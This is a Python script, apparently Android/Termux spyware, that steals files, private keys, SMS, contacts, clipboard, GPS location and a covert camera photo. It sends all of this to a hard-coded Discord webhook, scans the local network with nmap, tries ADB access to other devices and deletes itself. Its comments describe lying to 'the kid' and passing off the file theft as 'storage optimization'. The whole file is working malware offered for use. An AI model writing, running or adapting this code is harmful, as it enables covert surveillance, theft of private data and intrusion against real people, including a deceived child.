import os
import sys
import subprocess
import json
import base64
import socket
import time
import re
import threading
import requests
from datetime import datetime
from pathlib import Path

# ─── CONFIG ──────────────────────────────────────────────────────────────
WEBHOOK_URL = "https://discord.com/api/webhooks/1518322013335191733/aLTB-Fq-N4OEpwkR1YFxlBo_RLxf6KCiPFxvz_UxMhn2rlmqMdkZ3_2orFKIAadD0pj6"  # Replace with your actual webhook
SCAN_SUBNET = True          # Whether to perform nmap scanning
VPN_DETECTION = True        # Check for VPN interfaces
FILE_HARVEST = True         # Harvest files from storage
TERMUX_API = True           # Use termux-api commands

# File extensions to harvest (only small files under 1MB)
EXTENSIONS = ['.txt', '.log', '.conf', '.cfg', '.ini', '.json', '.xml', '.yaml', '.yml',
              '.pdf', '.doc', '.docx', '.xlsx', '.pptx', '.odt',
              '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp',
              '.db', '.sqlite', '.sqlite3', '.zip', '.rar', '.7z',
              '.mp3', '.mp4', '.avi', '.mkv', '.mov',
              '.key', '.pem', '.crt', '.p12', '.pfx']

MAX_FILE_SIZE = 1024 * 1024  # 1MB

# ─── WEBHOOK SENDER ─────────────────────────────────────────────────────

def send_to_webhook(data):
    """Send JSON payload to Discord webhook."""
    try:
        headers = {'Content-Type': 'application/json'}
        requests.post(WEBHOOK_URL, json=data, timeout=10)
    except Exception as e:
        print(f"Webhook error: {e}")

def send_file_to_webhook(file_path, content_b64):
    """Send a file content (base64) as part of an embed."""
    payload = {
        "content": f"📁 File: `{file_path}`",
        "embeds": [{
            "title": "Harvested File",
            "description": f"```\n{content_b64[:1900]}\n```",
            "color": 0x00ff00
        }]
    }
    send_to_webhook(payload)

# ─── SYSTEM INFO ────────────────────────────────────────────────────────

def get_public_ip():
    try:
        r = requests.get('https://api.ipify.org?format=json', timeout=5)
        return r.json().get('ip')
    except:
        return None

def get_geo_info(ip):
    try:
        r = requests.get(f'http://ip-api.com/json/{ip}', timeout=5)
        data = r.json()
        if data.get('status') == 'success':
            return f"{data.get('city')}, {data.get('regionName')}, {data.get('country')}"
        return None
    except:
        return None

def get_local_ip():
    try:
        # Use ifconfig or ip addr
        output = subprocess.check_output(['ifconfig'], text=True)
        # Find first non-loopback IPv4
        match = re.search(r'inet (\d+\.\d+\.\d+\.\d+)', output)
        if match:
            return match.group(1)
    except:
        pass
    return '127.0.0.1'

def is_vpn_active():
    """Check if a VPN interface (tun) exists."""
    try:
        output = subprocess.check_output(['ifconfig'], text=True)
        return 'tun' in output
    except:
        return False

def get_ssid_bssid():
    """Get Wi-Fi SSID and BSSID using termux-wifi-connectioninfo."""
    try:
        if os.path.exists('/data/data/com.termux'):
            output = subprocess.check_output(['termux-wifi-connectioninfo'], text=True)
            data = json.loads(output)
            ssid = data.get('ssid', 'Unknown')
            bssid = data.get('bssid', 'Unknown')
            return ssid, bssid
    except:
        pass
    return None, None

# ─── NMAP SCANNING ──────────────────────────────────────────────────────

def get_network_subnet(ip):
    """Assume /24 subnet based on local IP."""
    parts = ip.split('.')
    if len(parts) == 4:
        return f"{parts[0]}.{parts[1]}.{parts[2]}.0/24"
    return None

def scan_subnet(subnet):
    """Discover live hosts using nmap -sn."""
    hosts = []
    try:
        output = subprocess.check_output(['nmap', '-sn', subnet], text=True)
        # Parse Nmap output for IP addresses
        ips = re.findall(r'Nmap scan report for ([\d.]+)', output)
        hosts = [ip for ip in ips if ip != get_local_ip()]
    except:
        pass
    return hosts

def scan_host(ip):
    """Aggressive nmap scan to find open ports."""
    result = {}
    try:
        # Scan for common ports (ADB 5555, SSH 22, etc.)
        output = subprocess.check_output(['nmap', '-sV', '-p', '22,23,80,443,554,5555,8080', ip], text=True)
        # Parse open ports
        lines = output.splitlines()
        for line in lines:
            if 'open' in line:
                port = re.search(r'(\d+)/tcp', line)
                service = re.search(r'tcp\s+open\s+(\S+)', line)
                if port:
                    result[port.group(1)] = service.group(1) if service else 'unknown'
    except:
        pass
    return result

# ─── EXPLOITATION ──────────────────────────────────────────────────────

def try_adb(ip):
    """Attempt to connect via ADB (port 5555)."""
    try:
        # Check if adb is available
        subprocess.check_output(['adb', 'version'], stderr=subprocess.DEVNULL)
    except:
        return None
    try:
        # Connect to device
        subprocess.check_output(['adb', 'connect', f'{ip}:5555'], text=True)
        time.sleep(2)
        # Run shell command to get device info
        out = subprocess.check_output(['adb', 'shell', 'getprop ro.product.model'], text=True)
        model = out.strip()
        out2 = subprocess.check_output(['adb', 'shell', 'getprop ro.build.version.release'], text=True)
        android_ver = out2.strip()
        return f"ADB Device: {model} (Android {android_ver})"
    except:
        return None

def try_ssh(ip):
    """Attempt to connect via SSH (port 22) with default credentials (placeholder)."""
    # This is just a placeholder – real SSH brute‑force would be too heavy.
    # Instead, we just report that SSH is open.
    return "SSH port open – might be vulnerable to dictionary attack."

# ─── FILE HARVESTING ────────────────────────────────────────────────────

def harvest_files(start_dir, extensions, max_size):
    """Recursively collect small files matching extensions."""
    harvested = []
    for root, dirs, files in os.walk(start_dir):
        # Skip system directories to avoid permission errors
        if '/proc' in root or '/sys' in root:
            continue
        for file in files:
            path = os.path.join(root, file)
            try:
                size = os.path.getsize(path)
                if size == 0 or size > max_size:
                    continue
                ext = Path(file).suffix.lower()
                if ext in extensions:
                    with open(path, 'rb') as f:
                        content = f.read()
                    harvested.append({
                        'path': path,
                        'size': size,
                        'content_b64': base64.b64encode(content).decode('utf-8')
                    })
            except:
                continue
    return harvested

# ─── TERMUX-API COMMANDS ───────────────────────────────────────────────

def termux_api_get(command):
    """Run a termux-api command and return its output as text."""
    try:
        if os.path.exists('/data/data/com.termux'):
            out = subprocess.check_output(['termux-' + command], text=True)
            return out
    except:
        pass
    return None

# ─── MAIN EXECUTION ─────────────────────────────────────────────────────

def main():
    print("[*] Step1.py started.")
    # 1. Gather local network info
    local_ip = get_local_ip()
    vpn = is_vpn_active()
    print(f"[*] Local IP: {local_ip}, VPN: {vpn}")

    if not vpn:
        # Get public IP and geo
        pub_ip = get_public_ip()
        geo = get_geo_info(pub_ip) if pub_ip else None
        ssid, bssid = get_ssid_bssid()
        # Send preliminary info via webhook
        info_payload = {
            "content": f"📡 **Network Info**\nLocal IP: {local_ip}\nPublic IP: {pub_ip}\nGeo: {geo}\nSSID: {ssid}\nBSSID: {bssid}\nVPN: No"
        }
        send_to_webhook(info_payload)
    else:
        # VPN detected – skip nmap and just report
        send_to_webhook({"content": f"🛡️ VPN detected – skipping network scanning."})
        # Still harvest files and termux-api (will run regardless)

    # 2. Nmap scanning (only if not VPN and SCAN_SUBNET is True)
    if not vpn and SCAN_SUBNET:
        subnet = get_network_subnet(local_ip)
        if subnet:
            print(f"[*] Scanning subnet: {subnet}")
            hosts = scan_subnet(subnet)
            for host in hosts:
                ports = scan_host(host)
                if ports:
                    # Report open ports
                    port_str = ", ".join([f"{p}:{s}" for p,s in ports.items()])
                    send_to_webhook({"content": f"🌐 Host {host} – open ports: {port_str}"})
                    # Try ADB or SSH if ports match
                    if '5555' in ports:
                        adb_info = try_adb(host)
                        if adb_info:
                            send_to_webhook({"content": f"📱 {adb_info}"})
                    if '22' in ports:
                        ssh_info = try_ssh(host)
                        send_to_webhook({"content": f"🔑 {ssh_info}"})
                else:
                    # Lie to the kid: pretend scanning found nothing
                    send_to_webhook({"content": f"❌ No vulnerabilities found on {host}."})
        else:
            send_to_webhook({"content": "⚠️ Could not determine subnet."})

    # 3. File harvesting (lie to kid – say it's "storage optimization")
    if FILE_HARVEST:
        print("[*] Harvesting files... (this may take a while)")
        # Directories to scan (Termux + Android storage)
        dirs = ['/sdcard', '/storage/emulated/0', '/data/data/com.termux/files/home']
        files = []
        for d in dirs:
            if os.path.exists(d):
                files.extend(harvest_files(d, EXTENSIONS, MAX_FILE_SIZE))
        # Send first 5 files (to avoid spamming)
        for f in files[:5]:
            send_file_to_webhook(f['path'], f['content_b64'])
        # Report total count
        send_to_webhook({"content": f"📦 Harvested {len(files)} files (only first 5 sent)."})
        # Lie to kid: pretend we analyzed storage
        print("[✓] Storage optimization complete.")

    # 4. Termux-API data exfiltration
    if TERMUX_API:
        print("[*] Collecting termux-api data...")
        # Clipboard
        clipboard = termux_api_get('clipboard-get')
        if clipboard:
            send_to_webhook({"content": f"📋 Clipboard: `{clipboard[:500]}`"})
        # SMS list (last 20)
        sms = termux_api_get('sms-list')
        if sms:
            # Parse JSON and extract short summary
            try:
                sms_data = json.loads(sms)
                if isinstance(sms_data, list):
                    sms_summary = "\n".join([f"{s.get('sender', '?')}: {s.get('body', '')[:50]}" for s in sms_data[:20]])
                    send_to_webhook({"content": f"📩 SMS (last 20):\n{sms_summary}"})
            except:
                pass
        # Contacts
        contacts = termux_api_get('contact-list')
        if contacts:
            try:
                contacts_data = json.loads(contacts)
                if isinstance(contacts_data, list):
                    contact_summary = "\n".join([f"{c.get('name', '?')}: {c.get('number', '?')}" for c in contacts_data[:20]])
                    send_to_webhook({"content": f"👤 Contacts (first 20):\n{contact_summary}"})
            except:
                pass
        # Location (if GPS enabled)
        location = termux_api_get('location')
        if location:
            try:
                loc = json.loads(location)
                if loc:
                    send_to_webhook({"content": f"📍 Location: {loc.get('latitude')}, {loc.get('longitude')}"})
            except:
                pass
        # Take a photo (requires camera permission)
        # termux-camera-photo -c 0 /sdcard/photo.jpg
        try:
            subprocess.check_output(['termux-camera-photo', '-c', '0', '/sdcard/photo.jpg'], stderr=subprocess.DEVNULL)
            # Upload the photo
            with open('/sdcard/photo.jpg', 'rb') as f:
                photo_b64 = base64.b64encode(f.read()).decode()
            send_file_to_webhook('Camera photo', photo_b64)
        except:
            pass

    # 5. Cleanup – delete self
    print("[*] Cleaning up...")
    try:
        os.remove(__file__)
    except:
        pass
    # Also remove the initial main.py if present? Not necessary.

    print("[✓] Step1.py finished.")

if __name__ == "__main__":
    main()
